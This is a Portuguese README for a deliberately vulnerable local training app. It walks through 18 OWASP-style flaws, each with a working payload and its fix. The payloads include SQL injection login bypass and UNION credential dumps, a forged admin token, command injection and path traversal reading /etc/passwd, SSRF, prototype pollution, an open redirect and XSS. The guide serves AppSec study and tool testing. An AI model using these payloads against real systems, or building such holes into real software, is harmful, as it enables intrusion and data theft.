# Guia de vulnerabilidades — app-vuln

Laboratório **intencionalmente inseguro** para estudo de AppSec. Rode só localmente.

```bash
npm run vuln        # http://127.0.0.1:3001   (ou npm run vuln:wsl)
```

Base da API: `http://127.0.0.1:3001`. Cada falha está marcada no código com `// VULN Vn`.

| # | Vulnerabilidade | OWASP |
|---|---|---|
| V1 | SQL Injection no login (bypass de autenticação) | A03 Injection |
| V2 | Broken Authentication (token sem assinatura, forjável) | API2 / A07 |
| V3 | BOLA / IDOR (acesso a qualquer objeto sem autorização) | API1 / A01 |
| V4 | Mass Assignment (escalonamento de privilégio) | API3 / A08 |
| V5 | Exposição de dados sensíveis (senha, salário) | API3 / A02 |
| V6 | Sem rate limiting (força bruta) | API4 |
| V7 | Senha em texto puro | A02 |
| V8 | SQL Injection no filtro de busca | A03 |
| V9 | Command Injection | A03 |
| V10 | Path Traversal / LFI | A01 / A05 |
| V11 | SSRF | A10 / API7 |
| V12 | Prototype Pollution | A08 (moderna) |
| V13 | Clickjacking (sem X-Frame-Options/CSP) | A05 |
| V14 | Open Redirect | A01 |
| V15 | CORS mal configurado (reflete Origin + credenciais) | A05 / API8 |
| V16 | Misconfiguration (stack trace e SQL vazados, X-Powered-By) | A05 |
| V17 | Reflected XSS (server-side) | A03 |
| V18 | Stored / DOM XSS (bio e descrição via innerHTML) | A03 |

---

## V1 — SQL Injection no login (bypass)
O login monta a query concatenando strings. Entrar sem saber a senha:
```bash
curl -s -X POST http://127.0.0.1:3001/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' -- ","password":"x"}'
```
No navegador, no campo e-mail digite `' OR '1'='1' -- ` e qualquer senha → entra como a primeira conta (admin).
**Correção:** query parametrizada (`WHERE email = ?`).

## V2 — Broken Authentication (token forjável)
O token é só `base64(JSON)` sem assinatura. Forje um admin:
```bash
TOKEN=$(printf '{"sub":1,"role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -s http://127.0.0.1:3001/api/employees -H "Authorization: Bearer $TOKEN"
```
**Correção:** assinar com HMAC/JWT e verificar a assinatura (ver `src/auth.js` da versão segura).

## V3 — BOLA / IDOR
Ler qualquer funcionário, sem token:
```bash
curl -s http://127.0.0.1:3001/api/employees/1
```
**Correção:** exigir autenticação e checar se o solicitante pode ver aquele objeto.

## V4 — Mass Assignment (escalonamento de privilégio)
Um funcionário vira admin e muda o próprio salário:
```bash
curl -s -X PUT http://127.0.0.1:3001/api/employees/3 \
  -H 'Content-Type: application/json' -d '{"role":"admin","salary":999999}'
```
**Correção:** lista de campos permitidos por papel; `role`/`salary` só por admin.

## V5 / V7 — Exposição de dados + senha em texto puro
```bash
curl -s http://127.0.0.1:3001/api/employees | jq '.[0]'
```
Retorna `password` e `salary` de todos.
**Correção:** serializar só campos públicos; nunca retornar hash; armazenar senha com scrypt/bcrypt/argon2.

## V6 — Sem rate limiting
Nada limita tentativas de login → força bruta. Teste com um laço de `curl`.
**Correção:** limite por IP/conta + bloqueio temporário.

## V8 — SQL Injection na busca
```bash
curl -s "http://127.0.0.1:3001/api/employees?search=x' UNION SELECT 1,email,password,4,5,6,7,8,9 FROM employees -- "
```
(ajuste o número de colunas). Um `'` sozinho já vaza a query pelo erro (V16).
**Correção:** parametrizar o `LIKE` (`LIKE ?` com `%termo%`).

## V9 — Command Injection
```bash
curl -s "http://127.0.0.1:3001/api/tools/ping?host=127.0.0.1;id"
curl -s "http://127.0.0.1:3001/api/tools/ping?host=127.0.0.1;cat%20/etc/passwd"
```
**Correção:** não chamar shell com entrada do usuário; validar host; usar APIs que não passam por shell.

## V10 — Path Traversal / LFI
```bash
curl -s "http://127.0.0.1:3001/api/files?name=../secret-config.txt"
curl -s "http://127.0.0.1:3001/api/files?name=../../../../etc/passwd"
```
**Correção:** resolver o caminho e garantir que fica dentro da pasta permitida (`path.resolve` + checagem de prefixo).

## V11 — SSRF
O servidor busca qualquer URL que você mandar (inclusive rede interna/metadados de nuvem):
```bash
curl -s "http://127.0.0.1:3001/api/fetch-url?url=http://127.0.0.1:3001/api/employees"
```
**Correção:** allowlist de destinos; bloquear IPs privados/loopback; sem seguir redirects para interno.

## V12 — Prototype Pollution
```bash
curl -s -X POST http://127.0.0.1:3001/api/settings \
  -H 'Content-Type: application/json' -d '{"__proto__":{"isAdmin":true}}'
```
Responde `"polluted": true` — todo objeto novo passa a ter `isAdmin`.
**Correção:** rejeitar chaves `__proto__`/`constructor`/`prototype`; usar `Object.create(null)` ou `Map`; merge seguro.

## V13 — Clickjacking
Sem `X-Frame-Options`/CSP `frame-ancestors`, a página pode ser embutida em iframe.
**Correção:** `X-Frame-Options: DENY` ou `Content-Security-Policy: frame-ancestors 'none'`.

## V14 — Open Redirect
```bash
curl -s -o /dev/null -w '%{redirect_url}\n' "http://127.0.0.1:3001/go?to=https://evil.example"
```
**Correção:** redirecionar só para caminhos relativos/allowlist.

## V15 — CORS mal configurado
O servidor reflete o `Origin` e manda `Allow-Credentials: true`, permitindo que qualquer site leia respostas autenticadas via `fetch`.
**Correção:** allowlist explícita de origens; nunca refletir Origin com credenciais.

## V16 — Security Misconfiguration
Erros retornam `stack` e a `sql` executada; `X-Powered-By: Express` exposto.
**Correção:** mensagens genéricas; esconder detalhes; `app.disable('x-powered-by')`; headers de segurança (helmet).

## V17 — Reflected XSS (server-side)
```
http://127.0.0.1:3001/search?q=<script>alert(document.domain)</script>
```
**Correção:** escapar a saída HTML; CSP.

## V18 — Stored / DOM XSS
Logue, vá em **Meu perfil** e salve a bio:
```
<img src=x onerror=alert(document.cookie)>
```
Ela é renderizada com `innerHTML` na tabela de funcionários — dispara para todos que abrirem a lista. O mesmo vale para a descrição de projetos e para o campo de busca (DOM XSS).
**Correção:** usar `textContent`; sanitizar; CSP. (Veja a versão segura em `public/index.html`.)

---

## Como estudar com isto
1. **Explore** cada falha pelos exemplos acima (curl + navegador; opcionalmente Burp/ZAP como proxy).
2. **Compare** com a versão segura em `src/` — mesma funcionalidade, sem as falhas.
3. **Detecte** com ferramentas: é aqui que entra o objetivo do projeto — rodar SAST (semgrep), SCA/SBOM (trivy) e a camada de IA para encontrar isso automaticamente na pipeline.
